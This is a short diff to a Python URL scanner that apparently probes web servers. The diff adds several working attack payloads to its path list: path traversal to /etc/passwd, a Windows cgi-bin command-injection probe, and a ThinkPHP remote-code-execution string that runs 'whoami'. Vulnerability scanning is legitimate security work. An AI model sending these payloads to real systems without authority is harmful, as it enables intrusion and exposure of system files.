@@ -130,7 +130,13 @@ def scan(url, port):
            '/zh-CN/app/Callat/home',
            '/webalizer',
 		   '/ws/services',
-		   '/ws/services/HelloServices?wsdl'
+		   '/ws/services/HelloServices?wsdl',
+           '/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5C',
+		   '/foo/default/master/..%252F..%252F..%252F..%252Fetc%252fpasswd',
+		   '/foo/default/master/../../../etc/passwd',
+		   '/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami',
+           '/login?from=%2F',
+           '/jenkins'
            ]
     try:
         header = {
@@ -146,8 +152,11 @@ def scan(url, port):
             'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'
         }
         #file = open('result.txt', 'w+')
+        if 'http' in url:
+            url2 = url+":"+str(port)
+        else:
+            url2 = 'http://'+url+":"+str(port)
 
-        url2 = "http://"+url+":"+str(port)
         if port == 0:
             url2 = "https://"+url
 
